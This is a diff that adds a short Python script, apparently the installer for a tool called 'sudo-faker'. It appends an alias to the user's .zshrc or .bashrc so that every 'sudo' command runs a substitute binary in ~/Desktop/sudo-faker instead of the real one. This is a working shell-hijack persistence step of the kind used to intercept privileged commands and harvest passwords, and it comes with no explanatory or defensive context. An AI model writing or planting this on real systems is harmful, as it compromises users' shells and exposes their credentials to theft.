@@ -1,0 +1,12 @@
+#!/usr/bin/env python3
+import os
+
+x = os.popen(f"ls -a /home/{os.getlogin()}").read()
+if ".zshrc" in x:
+    with open(f"/home/{os.getlogin()}/.zshrc", "a") as f:
+        f.write(f'\nalias sudo="/home/{os.getlogin()}/Desktop/sudo-faker/sudo"')
+        f.close()
+else:
+    with open(f"/home/{os.getlogin()}/.bashrc", "a") as f:
+        f.write(f'\nalias sudo="/home/{os.getlogin()}/Desktop/sudo-faker/sudo"')
+        f.close()
